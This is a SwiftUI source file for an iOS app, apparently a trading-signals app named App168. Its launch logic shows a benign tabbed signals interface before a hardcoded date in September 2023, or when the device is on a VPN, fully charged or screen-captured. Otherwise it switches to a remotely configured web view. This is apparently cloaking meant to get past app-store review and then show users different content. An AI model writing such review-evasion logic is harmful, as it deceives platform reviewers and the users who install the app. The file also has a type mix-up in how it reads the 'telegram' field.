//
//  ContentView.swift
//  App168
//
//  Created by IGOR on 07/08/2023.
//

import SwiftUI
import Amplitude

struct ContentView: View {
    
    @State var isDead: Bool = false
    @State var server: String = ""
    
    @State var current_tab: Tab = Tab.Signals
    
    @State var telegram: URL = URL(string: "https://")!
    @State var isTelegram: Bool = false
    @State var isContacts: Bool = false
    
    @AppStorage("status") var status: Bool = false

    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color("bg")
                .ignoresSafeArea()
            
            if server.isEmpty || telegram.absoluteString == "https://" {
                
                LoadingView()
                
            } else {
                
                if server == "0" {
                    
                    if status {
                        
                        WebSystem()
                        
                    } else {
                        
                        USplash(isContacts: isContacts)
                    }
                    
                } else if server == "1" {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $current_tab, content: {
                                
                                SignalsView()
                                    .tag(Tab.Signals)
                                
                                CalendarView()
                                    .tag(Tab.Calendar)
                                
                                NewsView()
                                    .tag(Tab.News)
                                
                                CalculatorView()
                                    .tag(Tab.Calculator)
                                
                                MoreView()
                                    .tag(Tab.Settings)
                            })
                            
                            TabBar(selectedTab: $current_tab)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        .onAppear {

                            Amplitude.instance().logEvent("did_show_main_screen")
                        }
                        
                    } else {
                        
                        Splash()
                    }
                }
            }
        }
        .onAppear {
            
            check_data(isCaptured: false)
        }
    }
    
    private func check_data(isCaptured: Bool) {
        
        getFirebaseData(field: "isDead", dataType: .bool) { result1 in
            
            let result1 = result1 as? Bool ?? false
            isDead = result1
            
            getFirebaseData(field: "telegram", dataType: .bool) { result2 in
                
                let result2 = result2 as? URL ?? URL(string: "nil")!
                telegram = result2
                
                getFirebaseData(field: "isTelegram", dataType: .bool) { result3 in
                    
                    let result3 = result3 as? Bool ?? false
                    isTelegram = result3
                    
                    getFirebaseData(field: "isContacts", dataType: .bool) { result4 in
                        
                        let result4 = result4 as? Bool ?? false
                        isContacts = result4
                    }
                }
            }
        }
        
        let data = MyDataClass.getMyData()
        let now = Date().timeIntervalSince1970

        var dateComponents = DateComponents()
        dateComponents.year = 2023
        dateComponents.month = 9
        dateComponents.day = 6

        let targetDate = Calendar.current.date(from: dateComponents)!
        let targetUnixTime = targetDate.timeIntervalSince1970
        
        guard now > targetUnixTime else {

            server = "1"

            return
        }
        
        if data.isVpn || data.isFullChrg || isCaptured {
            
            server = "1"
            
        } else {
            
            server = "0"
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
